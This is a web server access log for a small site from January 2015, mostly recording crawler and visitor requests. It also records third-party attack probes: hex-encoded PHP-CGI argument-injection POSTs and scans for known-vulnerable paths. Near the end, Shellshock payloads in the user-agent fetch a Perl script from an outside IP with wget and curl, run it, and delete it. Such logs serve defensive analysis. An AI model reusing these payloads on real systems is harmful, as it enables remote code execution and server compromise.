54.72.227.125 - - [07/Jan/2015:10:53:47 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)"
107.23.45.196 - - [07/Jan/2015:15:06:57 -0500] "GET / HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.23.45.196 - - [07/Jan/2015:15:06:57 -0500] "GET /favicon.ico HTTP/1.1" 200 5108 "http://euterpea.com/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
157.55.39.79 - - [07/Jan/2015:16:02:12 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [07/Jan/2015:16:02:22 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
125.64.35.67 - - [07/Jan/2015:17:43:32 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
125.64.35.67 - - [07/Jan/2015:21:01:27 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
125.64.35.68 - - [07/Jan/2015:21:57:43 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.67.129 - - [07/Jan/2015:22:27:33 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [07/Jan/2015:22:27:33 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [07/Jan/2015:22:36:13 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.129 - - [07/Jan/2015:22:36:14 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
46.165.220.215 - - [07/Jan/2015:23:26:51 -0500] "GET /a2billing/customer/javascript/misc.js HTTP/1.1" 404 - - "curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5"
125.64.35.68 - - [08/Jan/2015:00:25:47 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.67.121 - - [08/Jan/2015:04:15:25 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [08/Jan/2015:04:25:29 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.129 - - [08/Jan/2015:04:25:30 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.31.48.30 - - [08/Jan/2015:05:14:31 -0500] "HEAD /rom-0 HTTP/1.1" 404 - - "Python-httplib2/0.7.4 (gzip)"
200.79.231.115 - - [08/Jan/2015:05:44:35 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
66.249.67.121 - - [08/Jan/2015:10:28:34 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [08/Jan/2015:10:28:34 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.254.209.57 - - [08/Jan/2015:10:41:21 -0500] "GET http://www.ly.com/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
128.36.229.104 - - [08/Jan/2015:12:06:56 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [08/Jan/2015:12:06:57 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [08/Jan/2015:12:06:57 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [08/Jan/2015:12:06:57 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [08/Jan/2015:12:06:57 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [08/Jan/2015:12:06:57 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [08/Jan/2015:12:06:57 -0500] "GET /favicon.ico HTTP/1.1" 200 5108 - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
46.233.204.35 - - [09/Jan/2015:09:02:56 -0500] "GET / HTTP/1.1" 200 - - "-"
66.249.67.137 - - [09/Jan/2015:10:00:31 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [09/Jan/2015:10:00:31 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [09/Jan/2015:10:16:20 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.64.35.68 - - [09/Jan/2015:14:04:43 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
5.9.11.122 - - [09/Jan/2015:15:41:36 -0500] "GET /?feed=comments-rss2 HTTP/1.1" 200 - - "-"
5.9.11.122 - - [09/Jan/2015:15:41:36 -0500] "GET /?feed=rss2 HTTP/1.1" 200 - - "-"
125.64.35.68 - - [09/Jan/2015:16:36:32 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
66.249.67.129 - - [09/Jan/2015:21:20:29 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.244.69.217 - - [09/Jan/2015:21:32:08 -0500] "GET /vtigercrm/test/upload/vtigercrm.txt HTTP/1.1" 404 - - "curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3"
125.64.35.67 - - [09/Jan/2015:21:35:26 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
125.64.35.67 - - [10/Jan/2015:00:49:32 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
209.59.166.70 - - [10/Jan/2015:01:38:09 -0500] "POST / HTTP/1.1" 200 - - "python-requests/2.5.1 CPython/2.6.6 Linux/2.6.32-431.23.3.el6.x86_64"
5.196.5.203 - - [10/Jan/2015:02:18:15 -0500] "GET /etc/lib/pChart2/examples/imageMap/index.php HTTP/1.1" 404 - - "-"
176.31.122.160 - - [10/Jan/2015:02:40:43 -0500] "GET / HTTP/1.1" 200 - - "-"
66.249.67.137 - - [10/Jan/2015:03:38:07 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.129 - - [10/Jan/2015:03:38:07 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.63.140.99 - - [10/Jan/2015:06:46:11 -0500] "GET / HTTP/1.1" 200 - - "Python-urllib/2.7"
62.210.170.53 - - [10/Jan/2015:11:08:15 -0500] "GET /cgi-bin/php HTTP/1.0" 404 - - "-"
64.74.215.136 - - [10/Jan/2015:16:11:25 -0500] "GET / HTTP/1.1" 200 - - ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:11:25 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:11:25 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:11:25 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:11:25 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:11:25 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:11:30 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/523.15 (KHTML, like Gecko) Safari/419.3 Qt"
64.74.215.136 - - [10/Jan/2015:16:12:00 -0500] "GET /new_user HTTP/1.1" 200 - - ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:12:00 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/new_user" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:12:00 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/new_user" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:12:00 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/new_user" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:12:00 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/new_user" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
64.74.215.136 - - [10/Jan/2015:16:12:00 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/new_user" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)""
193.104.41.59 - - [10/Jan/2015:22:04:41 -0500] "GET /rom-0 HTTP/1.1" 404 - - "Go 1.1 package http"
182.254.157.60 - - [10/Jan/2015:22:31:35 -0500] "GET http://www.ly.com/ HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
91.238.134.99 - - [11/Jan/2015:06:54:10 -0500] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
125.64.35.68 - - [11/Jan/2015:07:07:42 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
125.64.35.68 - - [11/Jan/2015:09:35:19 -0500] "GET http://s1.bdstatic.com/r/www/cache/static/home/img/logos/nuomi_ade5465d.png HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.3072; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0)"
179.42.214.44 - - [11/Jan/2015:11:23:34 -0500] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Zollard; Linux)"
179.42.214.44 - - [11/Jan/2015:11:23:35 -0500] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Zollard; Linux)"
179.42.214.44 - - [11/Jan/2015:11:23:35 -0500] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Zollard; Linux)"
179.42.214.44 - - [11/Jan/2015:11:23:35 -0500] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Zollard; Linux)"
179.42.214.44 - - [11/Jan/2015:11:23:36 -0500] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Zollard; Linux)"
62.210.86.137 - - [11/Jan/2015:14:10:51 -0500] "GET /CFIDE/administrator/ HTTP/1.1" 404 - - "-"
128.36.229.104 - - [11/Jan/2015:15:47:50 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [11/Jan/2015:15:47:50 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [11/Jan/2015:15:47:50 -0500] "GET /starter-template.css HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [11/Jan/2015:15:47:50 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [11/Jan/2015:15:47:50 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 304 0 "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [11/Jan/2015:15:47:50 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
128.36.229.104 - - [11/Jan/2015:15:52:21 -0500] "GET /myTestlll-1.0.0.tar.gz HTTP/1.1" 200 361611 - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
66.249.64.89 - - [11/Jan/2015:21:14:03 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.97 - - [11/Jan/2015:21:14:03 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.97 - - [11/Jan/2015:21:15:43 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.97 - - [11/Jan/2015:21:15:43 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.93 - - [11/Jan/2015:21:27:56 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET HTTP/1.1 HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET / HTTP/1.1" 200 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/bash HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/contact.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/defaultwebpage.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/env.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/fire.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/forum.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:10 -0500] "GET /cgi-bin/hello.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/index.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
76.12.235.157 - - [11/Jan/2015:23:10:11 -0500] "GET /cgi-bin/login.cgi HTTP/1.1" 404 - - "() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://202.191.121.230/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'"
